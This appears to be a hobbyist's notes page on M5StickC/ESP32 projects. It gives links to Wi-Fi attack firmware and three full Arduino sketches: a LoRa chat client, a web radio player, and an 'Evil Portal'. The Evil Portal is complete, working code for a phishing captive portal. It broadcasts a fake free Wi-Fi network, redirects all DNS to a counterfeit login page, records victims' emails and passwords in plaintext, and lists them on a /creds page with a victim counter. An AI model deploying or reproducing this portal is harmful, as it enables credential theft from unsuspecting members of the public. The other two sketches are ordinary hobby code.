
[M5Burner](https://docs.m5stack.com/en/uiflow/m5burner/intro)

## m5stickc

[First Steps with M5Stick-C](https://www.hackster.io/glowascii/first-steps-with-m5stick-c-74804c)

[M5StickC Arduino Library](https://github.com/m5stack/M5StickC)

[M5Stick-NEMO](https://github.com/n0xa/m5stick-nemo)

[M5Stick-SHARK](https://github.com/AH2005NA/m5stick-shark)

[Evil-M5Project](https://github.com/7h30th3r0n3/Evil-M5Project) 

[M5Stick-Launcher](https://github.com/bmorcelli/M5Stick-Launcher)

[Exploring possibilities of ESP32 platform to attack on nearby Wi-Fi networks.](https://github.com/risinek/esp32-wifi-penetration-tool?tab=readme-ov-file)

### SDCard
[How to Connect and Use a Micro SD Card with M5StickC PLUS2 – Step by Step Guide!](https://www.youtube.com/watch?v=1M5tol5SP_w)

### Evil Portal
https://github.com/JLSantos01/CapturePortalPTBR?tab=readme-ov-file
```
#include <M5StickC.h>
#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>

// Configuração do usuário
#define SSID_NAME "WiFi Livre-SP"
#define SUBTITLE "Servico gratuito de internet"
#define TITLE "Faca o Login:"
#define BODY "Primeiro, crie uma conta para ter acesso."
#define POST_TITLE "Estamos validando..."
#define POST_BODY "Sua conta foi validada! Agora, aguarde entre 3 a 5 minutos para que seja conectado a rede.</br>Obrigado."
#define PASS_TITLE "Credenciais"
#define CLEAR_TITLE "Limpo"

int capcount = 0;
int previous = -1; // Hack to keep track
int BUILTIN_LED = 10;

// Inicialização das configurações do sistema
const byte HTTP_CODE = 200;
const byte DNS_PORT = 53;
const byte TICK_TIMER = 1000;
IPAddress APIP(172, 0, 0, 1); // Gateway

String Credenciais = "";
unsigned long bootTime = 0, lastActivity = 0, lastTick = 0, tickCtr = 0;
DNSServer dnsServer;
WebServer webServer(80);

String input(String argName) {
  String a = webServer.arg(argName);
  a.replace("<", "&lt;");
  a.replace(">", "&gt;");
  a.substring(0, 200);
  return a;
}

String footer() {
  return "</div><div class=q><a>&#169; Todos os direitos reservados.</a></div>";
}

String header(String t) {
  String a = String(SSID_NAME);
  String CSS = "article { background: #f2f2f2; padding: 1.3em; }"
               "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
               "div { padding: 0.5em; }"
               "h1 { margin: 0.5em 0 0 0; padding: 0.5em; }"
               "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border-radius: 0; border: 1px solid #555555; }"
               "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
               "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
               "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; } "
               "textarea { width: 100%; }";
  String h = "<!DOCTYPE html><html>"
             "<head><title>" + a + " :: " + t + "</title>"
             "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
             "<style>" + CSS + "</style></head>"
             "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
  return h;
}

String creds() {
  return header(PASS_TITLE) + "<ol>" + Credenciais + "</ol><br><center><p><a style=\"color:blue\" href=/>Voltar para o Índice</a></p><p><a style=\"color:blue\" href=/clear>Limpar senhas</a></p></center>" + footer();
}

String index() {
  return header(TITLE) + "<div>" + BODY + "</ol></div><div><form action=/post method=post>" +
         "<b>Email:</b> <center><input type=text autocomplete=email name=email></input></center>" +
         "<b>Senha:</b> <center><input type=password name=Senha></input><input type=submit value=\"Sign in\"></form></center>" + footer();
}

String posted() {
  String email = input("email");
  String Senha = input("Senha");
  Credenciais = "<li>Email: <b>" + email + "</b></br>Senha: <b>" + Senha + "</b></li>" + Credenciais;
  return header(POST_TITLE) + POST_BODY + footer();
}

String clear() {
  String email = "<p></p>";
  String Senha = "<p></p>";
  Credenciais = "<p></p>";
  return header(CLEAR_TITLE) + "<div><p>A lista de credenciais foi resetada.</div></p><center><a style=\"color:blue\" href=/>Voltar para o Índice</a></center>" + footer();
}

void BLINK() { // O LED interno piscará 5 vezes quando uma senha for recebida.
  int count = 0;
  while (count < 5) {
    digitalWrite(BUILTIN_LED, LOW);
    delay(500);
    digitalWrite(BUILTIN_LED, HIGH);
    delay(500);
    count = count + 1;
  }
}

void setup() {
  M5.begin();
  M5.Lcd.setRotation(3);
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setSwapBytes(true);
  M5.Lcd.setTextSize(2);

  bootTime = lastActivity = millis();
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(APIP, APIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(SSID_NAME);
  dnsServer.start(DNS_PORT, "*", APIP); // Spoofing DNS (Apenas HTTP)

  webServer.on("/post", []() {
    capcount = capcount + 1;
    webServer.send(HTTP_CODE, "text/html", posted());
    M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
    M5.Lcd.setCursor(0, 45);
    M5.Lcd.print("status: ");
    M5.Lcd.print("Vítima dentro");
    BLINK();
    M5.Lcd.fillScreen(BLACK);
  });

  webServer.on("/creds", []() {
    webServer.send(HTTP_CODE, "text/html", creds());
  });
  webServer.on("/clear", []() {
    webServer.send(HTTP_CODE, "text/html", clear());
  });
  webServer.onNotFound([]() {
    lastActivity = millis();
    webServer.send(HTTP_CODE, "text/html", index());
  });
  webServer.begin();
  pinMode(BUILTIN_LED, OUTPUT);
  digitalWrite(BUILTIN_LED, HIGH);
}

void loop() {
  if ((millis() - lastTick) > TICK_TIMER) {
    lastTick = millis();
    if (capcount > previous) {
      previous = capcount;

      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setSwapBytes(true);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setTextColor(TFT_RED, TFT_BLACK);
      M5.Lcd.setCursor(0, 10);
      M5.Lcd.print("PORTAL CAPTIVO");
      M5.Lcd.setTextColor(TFT_GREEN, TFT_BLACK);
      M5.Lcd.setCursor(0, 35);
      M5.Lcd.print("WiFi IP: ");
      M5.Lcd.println(APIP);
      M5.Lcd.printf("SSID: %s\n", SSID_NAME);
      M5.Lcd.printf("Contagem de vítimas: %d\n", capcount);
    }
  }
  dnsServer.processNextRequest();
  webServer.handleClient();
}
```

### LoraChat

[A LoRa Chat long-distance communication using LoRa technology and ESP32 LoRa boards. ](https://github.com/Jaimi5/LoRaChat)

[LoRaChat_M5_STICKC](https://github.com/gato001k1/LoRaChat_M5_STICKC-_-2)

https://github.com/commodore1917/lorachat

M5StickC.ino
```
// Includes
//#include <Wire.h>
#include <SSD1306Wire.h> // you need to install the ESP8266 oled driver for SSD1306 
// by Daniel Eichorn and Fabrice Weinberg to get this file!
// It's in the arduino library manager :-D

#include <SPI.h>
#include <LoRa.h>    // this is the one by Sandeep Mistry, 
// (also in the Arduino Library manager :D )

// display descriptor
SSD1306Wire display(0x3c, 4, 15);

// definitions
//SPI defs for LoRa radio
#define SS 33
#define RST -1
#define DI0 32
// #define BAND 429E6

// LoRa Settings
#define BAND 434500000.00
#define spreadingFactor 9
// #define SignalBandwidth 62.5E3
#define SignalBandwidth 31.25E3
#define codingRateDenominator 8
#define preambleLength 8

// we also need the following config data:
// GPIO47 — SX1278’s SCK
// GPIO45 — SX1278’s MISO
// GPIO48 — SX1278’s MOSI
// GPIO21 — SX1278’s CS
// GPIO14 — SX1278’s RESET
// GPIO26 — SX1278’s IRQ(Interrupt Request)

// misc vars
String msg;
String displayName;
String sendMsg;
char chr;
int i = 0;

// Helpers func.s for LoRa
String mac2str(int mac)
{
  String s;
  byte *arr = (byte*) &mac;
  for (byte i = 0; i < 6; ++i)
  {
    char buff[3];
    // yea, this is a sprintf... fite me...
    sprintf(buff, "%2X", arr[i]);
    s += buff;
    if (i < 5) s += ':';
  }
  return s;
}

// let's set stuff up! 
void setup() {
  // reset the screen
  pinMode(16, OUTPUT);
  digitalWrite(16, LOW); // set GPIO16 low to reset OLED
  delay(50);
  digitalWrite(16, HIGH);
  Serial.begin(115200);
  while (!Serial); //If just the the basic function, must connect to a computer

  // Initialising the UI will init the display too.
  display.init();
  display.flipScreenVertically();
  display.setFont(ArialMT_Plain_10);
  display.setTextAlignment(TEXT_ALIGN_LEFT);
  display.drawString(5, 5, "LoRa Chat Node");
  display.display();

  SPI.begin(0, 36, 26, 33);
  LoRa.setPins(SS, RST, DI0);
  Serial.println("LoRa Chat Node");
  if (!LoRa.begin(BAND)) {
    Serial.println("Starting LoRa failed!");
    while (1);
  }

  Serial.print("LoRa Spreading Factor: ");
  Serial.println(spreadingFactor);
  LoRa.setSpreadingFactor(spreadingFactor);

  Serial.print("LoRa Signal Bandwidth: ");
  Serial.println(SignalBandwidth);
  LoRa.setSignalBandwidth(SignalBandwidth);

  LoRa.setCodingRate4(codingRateDenominator);

  LoRa.setPreambleLength(preambleLength);

  Serial.println("LoRa Initial OK!");
  display.drawString(5, 20, "LoRaChat is running!");
  display.display();
  delay(2000);
  Serial.println("Welcome to LoRaCHAT!");
  // get MAC as initial Nick
  int MAC = ESP.getEfuseMac();
  displayName = mac2str(MAC);
  //displayName.trim(); // remove the newline
  Serial.print("Initial nick is "); Serial.println(displayName);
  Serial.println("Use /? for command help...");
  Serial.println(": ");
  display.clear();
  display.drawString(5, 20, "Nickname set:");
  display.drawString(20, 30, displayName);
  display.display();
  delay(1000);
}

void loop() {
  // Receive a message first...
  int packetSize = LoRa.parsePacket();
  if (packetSize) {
    display.clear();
    display.drawString(3, 0, "Received Message!");
    display.display();
    while (LoRa.available()) {
      String data = LoRa.readString();
      display.drawString(20, 22, data);
      display.display();
      Serial.println(data);
    }
  } // once we're done there, we read bytes from Serial
  if (Serial.available()) {
    chr = Serial.read();
    Serial.print(chr); // so the user can see what they're doing :P
    if (chr == '\n' || chr == '\r') {
      msg += chr; //msg+='\0'; // should maybe terminate my strings properly....
      if (msg.startsWith("/")) {
        // clean up msg string...
        msg.trim(); msg.remove(0, 1);
        // process command...
        char cmd[1]; msg.substring(0, 1).toCharArray(cmd, 2);
        switch (cmd[0]){
          case '?':
            Serial.println("Supported Commands:");
            Serial.println("h - this message...");
            Serial.println("n - change Tx nickname...");
            Serial.println("d - print Tx nickname...");
            break;
          case 'n':
            displayName = msg.substring(2);
            Serial.print("Display name set to: "); Serial.println(displayName);
            break;
          case 'd':
            Serial.print("Your display name is: "); Serial.println(displayName);
            break;
          default:
            Serial.println("command not known... use 'h' for help...");
        }
        msg = "";
      }
      else {
        // ssshhhhhhh ;)
        Serial.print("Me: "); Serial.println(msg);
        // assemble message
        sendMsg += displayName;
        sendMsg += "> ";
        sendMsg += msg;
        // send message
        LoRa.beginPacket();
        LoRa.print(sendMsg);
        LoRa.endPacket();
        display.clear();
        display.drawString(1, 0, sendMsg);
        display.display();
        // clear the strings and start again :D
        msg = "";
        sendMsg = "";
        Serial.print(": ");
      }
    }
    else {
      msg += chr;
    }
  }
}
```

### [web radio](https://www.hackster.io/tommyho/arduino-web-radio-player-c4cb23)
```
TFTTerminal.h
#ifndef _TFTTERMINAL_H_
#define _TFTTERMINAL_H_

#include <M5StickC.h>
#include <Print.h>

class TFTTerminal : public Print
{
private:
    TFT_eSprite *disptr;
    char discharbuff[60][55];
    uint32_t xpos = 0,ypos = 0, dispos = 0;
    TFT_eSprite* _dis_buff_ptr = NULL;
    uint16_t _bkcolor = TFT_BLACK;
    uint16_t _color = TFT_GREEN;

    uint16_t _win_x_pos = 0,_win_y_pos = 0,_win_w = 160,_win_h = 80;
    uint16_t _font_x_size = 6,_font_y_size = 8;
    uint16_t _line_x_limit = 53,_line_y_limit = 30;

public:
    TFTTerminal(TFT_eSprite *dis_buff_ptr);
    ~TFTTerminal();
    
    void setcolor( uint16_t color, uint16_t bk_color );
    void setGeometry(uint16_t x, uint16_t y, uint16_t w, uint16_t h );
    void setFontsize(uint8_t size);

    size_t write(uint8_t) ;
    size_t write(const uint8_t *buffer, size_t size);
};


#endif

m5WebRadio.ino:
#include <M5StickC.h>
#include <WiFi.h>
#include <AudioFileSource.h>
#include <AudioFileSourceBuffer.h>
#include <AudioFileSourceICYStream.h>
#include <AudioGeneratorTalkie.h>
#include <AudioGeneratorMP3.h>
#include <AudioOutputI2S.h>
#include <AudioOutputI2SNoDAC.h>
#include <spiram-fast.h>

//  
//  m5WebRadio Version 2020.12c (MP3 / Voice Edition)
//  Board: M5StickC (esp32)
//  Author: tommyho510@gmail.com
//  Original Author: Milen Penev 
//  Required: Arduino library ESP8266Audio 1.60
//  Dependency: TFTTerminal.h
//

// Enter your WiFi, Station, button settings here:
const char *SSID = "XXXXXXXX";
const char *PASSWORD = "XXXXXXXX";
const int bufferSize = 16 * 1024; // buffer in byte, default 16 * 1024 = 16kb
char * arrayURL[11] = {
  "http://jenny.torontocast.com:8134/stream",
  "http://ais-edge09-live365-dal02.cdnstream.com/a25710",
  "http://188.165.212.154:8478/stream",
  "https://igor.torontocast.com:1025/;.mp3",
  "http://streamer.radio.co/s06b196587/listen",
  "http://sj32.hnux.com/stream?type=http&nocache=3104", 
  "http://sl32.hnux.com/stream?type=http&nocache=1257", 
  "http://media-ice.musicradio.com:80/ClassicFMMP3",
  "http://naxos.cdnstream.com:80/1255_128",
  "http://149.56.195.94:8015/steam",
  "http://ice2.somafm.com/christmas-128-mp3"
};
String arrayStation[11] = {
  "Mega Shuffle",
  "Orig. Top 40",
  "Way Up Radio",
  "Asia Dream",
  "KPop Way Radio",
  "Smooth Jazz",
  "Smooth Lounge",
  "Classic FM",
  "Lite Favorites",
  "MAXXED Out",
  "SomaFM Xmas"
};
const int LED = 10;   // GPIO LED 
const int BTNA = 37;  // GPIO Play and Pause
const int BTNB = 39;  // GPIO Switch Channel / Volume

// Objects and variables
TFT_eSprite Disbuff = TFT_eSprite(&M5.Lcd);
AudioGeneratorTalkie *talkie;          
AudioGeneratorMP3 *mp3;
AudioFileSourceICYStream *file;
AudioFileSourceBuffer *buff;
AudioOutputI2S *out;

const int numCh = sizeof(arrayURL)/sizeof(char *);
bool TestMode = false;
uint32_t LastTime = 0;
int playflag = 0;
int ledflag = 0;
//int btnaflag = 0;
//int btnbflag = 0;
float fgain = 1.0;
int sflag = 0;
char *URL = arrayURL[sflag]; 
String station = arrayStation[sflag];
uint8_t spHELLO[]         PROGMEM = {0x00,0xC0,0x80,0x60,0x59,0x08,0x10,0x3D,0xB7,0x00,0x62,0x64,0x3D,0x55,0x4A,0x9E,0x66,0xDA,0xF6,0x56,0xB7,0x3A,0x55,0x76,0xDA,0xED,0x92,0x75,0x57,0xA3,0x88,0xA8,0xAB,0x02,0xB2,0xF4,0xAC,0x67,0x23,0x73,0xC6,0x2F,0x0C,0xF3,0xED,0x62,0xD7,0xAD,0x13,0xA5,0x46,0x8C,0x57,0xD7,0x21,0x0C,0x22,0x4F,0x93,0x4B,0x27,0x37,0xF0,0x51,0x69,0x98,0x9D,0xD4,0xC8,0xFB,0xB8,0x98,0xB9,0x56,0x23,0x2F,0x93,0xAA,0xE2,0x46,0x8C,0x52,0x57,0x66,0x2B,0x8C,0x07};
uint8_t spHELP[]          PROGMEM = {0x08,0xB0,0x4E,0x94,0x00,0x21,0xA8,0x09,0x20,0x66,0xF1,0x96,0xC5,0x66,0xC6,0x54,0x96,0x47,0xEC,0xAA,0x05,0xD9,0x46,0x3B,0x71,0x94,0x51,0xE9,0xD4,0xF9,0xA6,0xB7,0x18,0xB5,0x35,0xB5,0x25,0xA2,0x77,0xB6,0xA9,0x97,0xB1,0xD7,0x85,0xF3,0xA8,0x81,0xA5,0x6D,0x55,0x4E,0x0D,0x00,0xC0,0x00,0x1B,0x3D,0x30,0x00,0x0F};
uint8_t spREADY[]         PROGMEM = {0x6A,0xB4,0xD9,0x25,0x4A,0xE5,0xDB,0xD9,0x8D,0xB1,0xB2,0x45,0x9A,0xF6,0xD8,0x9F,0xAE,0x26,0xD7,0x30,0xED,0x72,0xDA,0x9E,0xCD,0x9C,0x6D,0xC9,0x6D,0x76,0xED,0xFA,0xE1,0x93,0x8D,0xAD,0x51,0x1F,0xC7,0xD8,0x13,0x8B,0x5A,0x3F,0x99,0x4B,0x39,0x7A,0x13,0xE2,0xE8,0x3B,0xF5,0xCA,0x77,0x7E,0xC2,0xDB,0x2B,0x8A,0xC7,0xD6,0xFA,0x7F};
uint8_t spSTOP[]          PROGMEM = {0x0C,0xF8,0xA5,0x4C,0x02,0x1A,0xD0,0x80,0x04,0x38,0x00,0x1A,0x58,0x59,0x95,0x13,0x51,0xDC,0xE7,0x16,0xB7,0x3A,0x75,0x95,0xE3,0x1D,0xB4,0xF9,0x8E,0x77,0xDD,0x7B,0x7F,0xD8,0x2E,0x42,0xB9,0x8B,0xC8,0x06,0x60,0x80,0x0B,0x16,0x18,0xF8,0x7F};
uint8_t spSWITCH[]        PROGMEM = {0x08,0xF8,0x3B,0x93,0x03,0x1A,0xB0,0x80,0x01,0xAE,0xCF,0x54,0x40,0x33,0x99,0x2E,0xF6,0xB2,0x4B,0x9D,0x52,0xA7,0x36,0xF0,0x2E,0x2F,0x70,0xDB,0xCB,0x93,0x75,0xEE,0xA6,0x4B,0x79,0x4F,0x36,0x4C,0x89,0x34,0x77,0xB9,0xF9,0xAA,0x5B,0x08,0x76,0xF5,0xCD,0x73,0xE4,0x13,0x99,0x45,0x28,0x77,0x11,0xD9,0x40,0x80,0x55,0xCB,0x25,0xE0,0x80,0x59,0x2F,0x23,0xE0,0x01,0x0B,0x08,0xA0,0x46,0xB1,0xFF,0x07};
uint8_t spPAUSE[]         PROGMEM = {0x00,0x00,0x00,0x00,0xFF,0x0F};

void Displaybuff() {
    if (TestMode) {
        Disbuff.setTextSize(1);
        Disbuff.setTextColor(TFT_RED);
        Disbuff.drawString("Test Mode", 0, 0, 1);
        Disbuff.setTextColor(TFT_WHITE);
    }
    Disbuff.pushSprite(0, 0);
}

void ColorBar() {
    float color_r, color_g, color_b;
    color_r = 0;
    color_g = 0;
    color_b = 255;

    for (int i = 0; i < 384; i=i+4) {
        if (i < 128) {
            color_r = i * 2;
            color_g = 0;
            color_b = 255 - (i * 2);
        }
        else if ((i >= 128) && (i < 256)) {
            color_r = 255 - ((i - 128) * 2);
            color_g = (i - 128) * 2;
            color_b = 0;
        }
        else if ((i >= 256) && (i < 384)) {
            color_r = 0;
            color_g = 255 - ((i - 256) * 2);
            ;
            color_b = (i - 256) * 2;
            ;
        }
        Disbuff.fillRect(0, 0, 180, 80, Disbuff.color565(color_r, color_g, color_b));
        Displaybuff();
    }

    for (int i = 0; i < 4; i++) {
        switch (i) {
        case 0:
            color_r = 0;
            color_g = 0;
            color_b = 0;
            break;
        case 1:
            color_r = 255;
            color_g = 0;
            color_b = 0;
            break;
        case 2:
            color_r = 0;
            color_g = 255;
            color_b = 0;
            break;
        case 3:
            color_r = 0;
            color_g = 0;
            color_b = 255;
            break;
        }
        for (int n = 0; n < 240; n++) {
            color_r = (color_r < 255) ? color_r + 1.0625 : 255U;
            color_g = (color_g < 255) ? color_g + 1.0625 : 255U;
            color_b = (color_b < 255) ? color_b + 1.0625 : 255U;
            Disbuff.drawLine(n, i * 20, n, (i + 1) * 20, Disbuff.color565(color_r, color_g, color_b));
        }
    }
    Displaybuff();
    delay(500);

    for (int i = 0; i < 4; i++) {
        switch (i) {
        case 0:
            color_r = 255;
            color_g = 255;
            color_b = 255;
            break;
        case 1:
            color_r = 255;
            color_g = 0;
            color_b = 0;
            break;
        case 2:
            color_r = 0;
            color_g = 255;
            color_b = 0;
            break;
        case 3:
            color_r = 0;
            color_g = 0;
            color_b = 255;
            break;
        }
        for (int n = 0; n < 240; n++) {
            color_r = (color_r > 2) ? color_r - 1.0625 : 0U;
            color_g = (color_g > 2) ? color_g - 1.0625 : 0U;
            color_b = (color_b > 2) ? color_b - 1.0625 : 0U;
            Disbuff.drawLine(159 - n, i * 20, 159 - n, (i + 1) * 20, Disbuff.color565(color_r, color_g, color_b));
        }
    }
    Displaybuff();
    delay(500);
}

void setup() {
  Serial.begin(115200);
  pinMode(LED, OUTPUT);
  digitalWrite(LED , HIGH);
  pinMode(BTNA, INPUT);
  pinMode(BTNB, INPUT);

  M5.begin();
  M5.Lcd.setRotation(3);

  // Screen Check
  Disbuff.createSprite(160, 80);
  Disbuff.fillRect(0,0,160,80,Disbuff.color565(10,10,10));
  Disbuff.pushSprite(0,0);
  delay(500);
  M5.Axp.ScreenBreath(12);
  ColorBar();

  Disbuff.fillRect(0,0,160,80,TFT_BLACK);
  Disbuff.setTextSize(2);
  Disbuff.drawString("M5StickC", 0, 0, 1);
  Disbuff.drawString("    WebRadio", 0, 35, 1);
  Disbuff.pushSprite(0, 0);
  M5.update();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("M5StickC");
  M5.Lcd.println("    WebRadio");
  delay(1000);
  M5.Lcd.println("WiFi");
  M5.Lcd.println("  Connecting");
  initwifi();

//  StartPlaying();
  M5.Lcd.fillScreen(BLACK);
  M5.Lcd.setTextSize(2);
  M5.Lcd.setCursor(0, 0, 2);
  M5.Lcd.print("Ready");

  M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(0, 30, 2);
  M5.Lcd.print("Ch ");
  M5.Lcd.print(sflag + 1);
  M5.Lcd.print(" - ");
  M5.Lcd.print(station);
  M5.Lcd.print("          ");

  Serial.printf("STATUS(System) Ready \n\n");
  out = new AudioOutputI2S(0, 1); // Output to builtInDAC
  out->SetOutputModeMono(true);
  out->SetGain(fgain*0.05);
  talkie = new AudioGeneratorTalkie();
  talkie->begin(nullptr, out);
  talkie->say(spREADY, sizeof(spREADY));
  talkie->say(spPAUSE, sizeof(spPAUSE));
}

void loop() {
  static int lastms = 0;
  if (playflag == 0) {
    if (digitalRead(BTNA) ==  LOW) {
      StartPlaying();
      playflag = 1;
      M5.Lcd.setTextSize(2);
      M5.Lcd.setCursor(0, 0, 2);
      M5.Lcd.print("Playing");
    }

    if (digitalRead(BTNB) ==  LOW) {
      sflag = (sflag + 1) % numCh;
      URL = arrayURL[sflag];
      station = arrayStation[sflag];           
      M5.Lcd.fillScreen(BLACK);
      M5.Lcd.setTextSize(1);
      M5.Lcd.setCursor(0, 30, 2);
      M5.Lcd.print("Ch ");
      M5.Lcd.print(sflag + 1);
      M5.Lcd.print(" - ");
      M5.Lcd.print(station);
      M5.Lcd.print("          ");
      talkie->begin(nullptr, out);
      talkie->say(spSWITCH, sizeof(spSWITCH));
      talkie->say(spPAUSE, sizeof(spPAUSE));
      delay (200);
    }
  }

  if (playflag == 1) {
    if (mp3->isRunning()) {
      if (millis() - lastms > 1000) {
        lastms = millis();
        Serial.printf("STATUS(Streaming) %d ms...\n", lastms);

        ledflag = ledflag + 1;
        if (ledflag > 1) {
          ledflag = 0;
          digitalWrite(LED , HIGH);
        } else {
          digitalWrite(LED , LOW);
        }

      }
      if (!mp3->loop()) mp3->stop();
    } else {
      Serial.printf("MP3 done\n");
      playflag = 0;
      digitalWrite(LED , HIGH);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setCursor(0, 0, 2);
      M5.Lcd.print("Stop     ");
//      ESP.restart();
    }
    if (digitalRead(BTNA) ==  LOW) {
      StopPlaying();
      playflag = 0;
      digitalWrite(LED , HIGH);
      M5.Lcd.setTextSize(2);
      M5.Lcd.setCursor(0, 0, 2);
      M5.Lcd.print("Stop     ");
      talkie->begin(nullptr, out);
      talkie->say(spSTOP, sizeof(spSTOP));
      talkie->say(spPAUSE, sizeof(spPAUSE));
      M5.Lcd.fillRect(109, 0, 160, 21, BLACK);
      delay(200);
    }
    if (digitalRead(BTNB) ==  LOW) {
      fgain = fgain + 1.0;
      if (fgain > 10.0) {
        fgain = 1.0;
      }
      out->SetGain(fgain*0.05);
      M5.Lcd.fillRect(109, 0, 160, 21, BLACK);
      M5.Lcd.fillTriangle(109, 20, 109 + (5 * fgain), 20, 109 + (5 * fgain), 20 - (2 * fgain), BLUE);
      Serial.printf("STATUS(Gain) %f \n", fgain*0.05);
      delay(200);
    }
  }
}

void StartPlaying() {
  file = new AudioFileSourceICYStream(URL);
  file->RegisterMetadataCB(MDCallback, (void*)"ICY");
  buff = new AudioFileSourceBuffer(file, bufferSize);
  buff->RegisterStatusCB(StatusCallback, (void*)"buffer");
  out = new AudioOutputI2S(0, 1); // Output to builtInDAC
  out->SetOutputModeMono(true);
//  out->SetGain(0.3);
  out->SetGain(fgain*0.05);
  M5.Lcd.fillTriangle(109, 20, 109 + (5 * fgain), 20, 109 + (5 * fgain), 20 - (2 * fgain), BLUE);
  mp3 = new AudioGeneratorMP3();
  mp3->RegisterStatusCB(StatusCallback, (void*)"mp3");
  mp3->begin(buff, out);
  Serial.printf("STATUS(URL) %s \n", URL);
  Serial.flush();
}

void StopPlaying() {
  if (mp3) {
    mp3->stop();
    delete mp3;
    mp3 = NULL;
  }
  if (buff) {
    buff->close();
    delete buff;
    buff = NULL;
  }
  if (file) {
    file->close();
    delete file;
    file = NULL;
  }
  Serial.printf("STATUS(Stopped)\n");
  Serial.flush();
}

void initwifi() {
  WiFi.disconnect();
  WiFi.softAPdisconnect(true);
  WiFi.mode(WIFI_STA);
  WiFi.begin(SSID, PASSWORD);

  // Try forever
  int i = 0;
  while (WiFi.status() != WL_CONNECTED) {
    Serial.print("STATUS(Connecting to WiFi) ");
    delay(1000);
    i = i + 1;
    if (i > 10) {
      ESP.restart();
    }
  }
  Serial.println("OK");
}

// Called when a metadata event occurs (i.e. an ID3 tag, an ICY block, etc.
void MDCallback(void *cbData, const char *type, bool isUnicode, const char *string) {
  const char *ptr = reinterpret_cast<const char *>(cbData);
  (void) isUnicode; // Punt this ball for now
  // Note that the type and string may be in PROGMEM, so copy them to RAM for printf
  char s1[32], s2[64];
  strncpy_P(s1, type, sizeof(s1));
  s1[sizeof(s1) - 1] = 0;
  strncpy_P(s2, string, sizeof(s2));
  s2[sizeof(s2) - 1] = 0;
  Serial.printf("METADATA(%s) '%s' = '%s'\n", ptr, s1, s2);
  M5.Lcd.setTextSize(1);
  M5.Lcd.setCursor(0, 45, 2);
  M5.Lcd.print(s2);
  M5.Lcd.print("                                                                                          ");
  Serial.flush();
}

// Called when there's a warning or error (like a buffer underflow or decode hiccup)
void StatusCallback(void *cbData, int code, const char *string) {
  const char *ptr = reinterpret_cast<const char *>(cbData);
  // Note that the string may be in PROGMEM, so copy it to RAM for printf
  char s1[64];
  strncpy_P(s1, string, sizeof(s1));
  s1[sizeof(s1) - 1] = 0;
  Serial.printf("STATUS(%s) '%d' = '%s'\n", ptr, code, s1);
  Serial.flush();
}

```
## M5Stick-V 

## M5Stack
